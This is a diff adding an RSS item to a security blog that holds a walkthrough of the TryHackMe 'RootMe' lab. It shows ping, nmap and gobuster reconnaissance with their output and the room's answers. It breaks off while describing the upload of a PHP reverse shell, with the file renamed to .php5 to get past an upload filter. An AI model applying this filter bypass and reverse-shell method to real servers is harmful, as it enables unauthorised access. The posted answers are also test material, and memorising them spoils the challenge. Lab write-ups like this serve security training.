@@ -6,7 +6,278 @@
     <description>Recent content in Posts on Security Blogs</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Thu, 24 Aug 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://secblogs.netlify.app/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 28 Sep 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://secblogs.netlify.app/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>RootMe &gt;_</title>
+      <link>https://secblogs.netlify.app/posts/rootme/rootme/</link>
+      <pubDate>Thu, 28 Sep 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://secblogs.netlify.app/posts/rootme/rootme/</guid>
+      <description>Intro This RootMe challenge requires you to exploit a web server and find hidden directories and also get a reverse shell to find the flag through privilege escalation.
+Room Link: https://tryhackme.com/room/rrootme
+⚠️Tools used: &amp;gt; Ping &amp;gt; Nmap &amp;gt; Netcat &amp;gt; Gobuster &amp;gt; Python # Task 1 Deploy the machine Connect to TryHackMe network through openvpn and deploy the machine. Click on the start machine button. Wait for few second after this it will show an ip addr.</description>
+      <content>
+&lt;img src=&#34;../home.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;h1 id=&#34;intro&#34;&gt;Intro&lt;/h1&gt;
+&lt;p&gt;This RootMe challenge requires you to exploit a web server and find hidden directories and also get a reverse shell to find the flag through privilege escalation.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Room Link: &lt;a href=&#34;https://tryhackme.com/room/rrootme&#34;&gt;https://tryhackme.com/room/rrootme&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;⚠️Tools used:&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;gt; Ping&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;gt; Nmap&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;gt; Netcat&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;gt; Gobuster&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;gt; Python&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;-task-1-deploy-the-machine&#34;&gt;# Task 1 Deploy the machine&lt;/h1&gt;
+&lt;p&gt;Connect to TryHackMe network through openvpn and deploy the machine.
+Click on the &lt;code&gt;start machine&lt;/code&gt; button.
+Wait for few second after this it will show an ip addr.&lt;br&gt;
+My ip: &lt;code&gt;10.10.156.27&lt;/code&gt;&lt;br&gt;
+In your case ip may be different.&lt;/p&gt;
+&lt;h1 id=&#34;-task-2-reconnaissance&#34;&gt;# Task 2 Reconnaissance&lt;/h1&gt;
+&lt;h1 id=&#34;ping-scan&#34;&gt;ping scan&lt;/h1&gt;
+&lt;p&gt;Check whether the host is reachable or not across the ip address.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ping &lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.156.27&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PING &lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.156.27&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.156.27&lt;/span&gt;) &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt;) bytes of data.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; bytes from &lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.156.27&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; icmp_seq&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ttl&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;263&lt;/span&gt; ms
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; bytes from &lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.156.27&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; icmp_seq&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; ttl&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;232&lt;/span&gt; ms
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; bytes from &lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.156.27&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; icmp_seq&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; ttl&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;297&lt;/span&gt; ms
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; bytes from &lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.156.27&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; icmp_seq&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; ttl&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;286&lt;/span&gt; ms
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;C
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;---&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.156.27&lt;/span&gt; ping statistics &lt;span style=&#34;color:#f92672&#34;&gt;---&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; packets transmitted, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; received, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; packet loss, time &lt;span style=&#34;color:#ae81ff&#34;&gt;4008&lt;/span&gt;ms
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rtt min&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;avg&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;max&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;mdev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;231.753&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;269.480&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;297.297&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;24.998&lt;/span&gt; ms
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Host is reachable now go to the site, copy paste the ip into your address bar of your browser.&lt;/p&gt;
+&lt;p&gt;Now view the page source:
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;1&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;html&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;View page source&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-html&#34; &gt;&lt;code&gt;
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
+    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
+    &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;css/home.css&amp;#34;&amp;gt;
+    &amp;lt;script src=&amp;#34;js/maquina_de_escrever.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
+    &amp;lt;title&amp;gt;HackIT - Home&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+    &amp;lt;div class=&amp;#34;main-div&amp;#34;&amp;gt;
+        &amp;lt;p class=&amp;#34;title&amp;#34;&amp;gt;root@rootme:~#&amp;lt;/p&amp;gt;
+        &amp;lt;p class=&amp;#34;description&amp;#34;&amp;gt;
+            Can you root me?
+        &amp;lt;/p&amp;gt;
+    &amp;lt;/div&amp;gt;
+
+    &amp;lt;!--  --&amp;gt;
+
+    &amp;lt;script&amp;gt;
+        const titulo = document.querySelector(&amp;#39;.title&amp;#39;);
+        typeWrite(titulo);
+    &amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+We get nothing important here.
+Now do the nmap scan.&lt;/p&gt;
+&lt;h1 id=&#34;nmap-scan&#34;&gt;nmap scan&lt;/h1&gt;
+&lt;p&gt;Run nmap scan to search which ports are open and much more. First create the nmap folder and Run the following command.&lt;br&gt;
+command:&lt;code&gt;mkdir nmap&lt;/code&gt;&lt;br&gt;
+command:&lt;code&gt;cd nmap&lt;/code&gt;&lt;br&gt;
+command:&lt;code&gt;nmap -sV -oN nmap/rootme 10.10.156.27&lt;/code&gt;\&lt;/p&gt;
+&lt;p&gt;command breakdown:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;-sV : Version Detection&lt;/li&gt;
+&lt;li&gt;-oN : store the output into nmap folder&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.94 scan initiated Wed Sep 27 23:49:49 2023 as: nmap -sV -oN nmap/rootm\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;e 10.10.156.27
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.156.27&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0.37&lt;/span&gt;s latency).
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed tcp &lt;span style=&#34;color:#a6e22e&#34;&gt;ports&lt;/span&gt; (conn&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;refused)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;tcp open  ssh     OpenSSH &lt;span style=&#34;color:#ae81ff&#34;&gt;7.6&lt;/span&gt;p1 Ubuntu &lt;span style=&#34;color:#ae81ff&#34;&gt;4u&lt;/span&gt;buntu0&lt;span style=&#34;color:#ae81ff&#34;&gt;.3&lt;/span&gt; (Ubuntu Linux; protocol &lt;span style=&#34;color:#ae81ff&#34;&gt;2.&lt;/span&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;tcp open  http    Apache httpd &lt;span style=&#34;color:#ae81ff&#34;&gt;2.4.29&lt;/span&gt; ((Ubuntu))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service detection performed. Please report any incorrect results at https:&lt;span style=&#34;color:#75715e&#34;&gt;//nma\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;p.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap done at Thu Sep 28 00:03:21 2023 -- 1 IP address (1 host up) scanned in \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;811.92 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Port 22- ssh&lt;/p&gt;
+&lt;p&gt;Here we are able to see that our SSH port is open. This port isn&amp;rsquo;t too vulnerable unless we have found someones credentials. Se we will not mess with it.&lt;/p&gt;
+&lt;p&gt;Port 80- http&lt;/p&gt;
+&lt;p&gt;It is here were we find a webservice. Lets poke around and see if there is anyting interesting.&lt;/p&gt;
+&lt;h1 id=&#34;qna&#34;&gt;QnA:&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Scan the machine, how many ports are open?&lt;br&gt;
+&lt;code&gt;ans: 2&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;What version pf Apache is running?&lt;br&gt;
+&lt;code&gt;ans: 2.4.29&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;What service is running on port 22?&lt;br&gt;
+&lt;code&gt;ans: ssh&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;finding-hidden-directories&#34;&gt;Finding hidden directories&lt;/h1&gt;
+&lt;p&gt;So there may be some hidden directories, we are going to use gobuster tool for that. Run the following command.
+command:&lt;code&gt;gobuster dir -u http://10.10.156.27/ -w /home//sumit/ctf/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;┌──&lt;/span&gt;(sumit&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;㉿&lt;/span&gt;mr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;nob0dy)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;~/&lt;/span&gt;ctf&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;tryhackme]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;└─$&lt;/span&gt; gobuster dir &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;u http:&lt;span style=&#34;color:#75715e&#34;&gt;//10.10.156.27/ -w /home//sumit/ctf/directory-list-2.3-medium.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Gobuster v3&lt;span style=&#34;color:#ae81ff&#34;&gt;.6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;by OJ &lt;span style=&#34;color:#a6e22e&#34;&gt;Reeves&lt;/span&gt; (&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;TheColonial) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; Christian &lt;span style=&#34;color:#a6e22e&#34;&gt;Mehlmauer&lt;/span&gt; (&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;firefart)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Url:                     http:&lt;span style=&#34;color:#75715e&#34;&gt;//10.10.156.27/
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Method:                  GET
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Threads:                 &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Wordlist:                &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;home&lt;span style=&#34;color:#75715e&#34;&gt;//sumit/ctf/directory-list-2.3-medium.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Negative Status codes:   &lt;span style=&#34;color:#ae81ff&#34;&gt;404&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] User Agent:              gobuster&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3.6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Timeout:                 &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;s
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting gobuster in directory enumeration mode
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;uploads&lt;/span&gt;              (Status: &lt;span style=&#34;color:#ae81ff&#34;&gt;301&lt;/span&gt;) [Size: &lt;span style=&#34;color:#ae81ff&#34;&gt;314&lt;/span&gt;] [&lt;span style=&#34;color:#f92672&#34;&gt;--&amp;gt;&lt;/span&gt; http:&lt;span style=&#34;color:#75715e&#34;&gt;//10.10.156.27/uploads/]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;css&lt;/span&gt;                  (Status: &lt;span style=&#34;color:#ae81ff&#34;&gt;301&lt;/span&gt;) [Size: &lt;span style=&#34;color:#ae81ff&#34;&gt;310&lt;/span&gt;] [&lt;span style=&#34;color:#f92672&#34;&gt;--&amp;gt;&lt;/span&gt; http:&lt;span style=&#34;color:#75715e&#34;&gt;//10.10.156.27/css/]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;js&lt;/span&gt;                   (Status: &lt;span style=&#34;color:#ae81ff&#34;&gt;301&lt;/span&gt;) [Size: &lt;span style=&#34;color:#ae81ff&#34;&gt;309&lt;/span&gt;] [&lt;span style=&#34;color:#f92672&#34;&gt;--&amp;gt;&lt;/span&gt; http:&lt;span style=&#34;color:#75715e&#34;&gt;//10.10.156.27/js/]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;panel&lt;/span&gt;                (Status: &lt;span style=&#34;color:#ae81ff&#34;&gt;301&lt;/span&gt;) [Size: &lt;span style=&#34;color:#ae81ff&#34;&gt;312&lt;/span&gt;] [&lt;span style=&#34;color:#f92672&#34;&gt;--&amp;gt;&lt;/span&gt; http:&lt;span style=&#34;color:#75715e&#34;&gt;//10.10.156.27/panel/]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;Progress: &lt;span style=&#34;color:#ae81ff&#34;&gt;8609&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;220561&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;3.90&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;C
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;] Keyboard interrupt detected, terminating.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Progress: &lt;span style=&#34;color:#ae81ff&#34;&gt;8609&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;220561&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;3.90&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Finished
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We found some directories like uploads and panel.&lt;/p&gt;
+&lt;h1 id=&#34;qna-1&#34;&gt;QnA:&lt;/h1&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;Find directories on the web server using the GoBuster tool.&lt;br&gt;
+&lt;code&gt;ans: no answer needed&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the hidden directory?&lt;br&gt;
+&lt;code&gt;ans: /panel/&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;-task-3-getting-a-shell&#34;&gt;# Task 3 Getting a shell&lt;/h1&gt;
+&lt;p&gt;Try to reach &lt;code&gt;http://$IP/panel/&lt;/code&gt;
+we have a section to upload a file, so we have a chance to get the reverse shell so try to upload reverse-shell-php file which is available on the internet. Change the ip address by your ip and change the port in the php file. Now upload the file.&lt;/p&gt;
+
+&lt;img src=&#34;../panel1.png&#34;  alt=&#34;home page&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;We get some error, we can&amp;rsquo;t upload php file so we have to find another way to upload file.
+Now try to change the file extension from php to &lt;code&gt;php5&lt;/code&gt; or &lt;code&gt;phtml&lt;/code&gt; etc.&lt;br&gt;
+command:&lt;code&gt;mv php-reverse-shell.php php-reverse-shell.php5&lt;/code&gt;&lt;br&gt;
+Try to upload the file again.&lt;/p&gt;
+
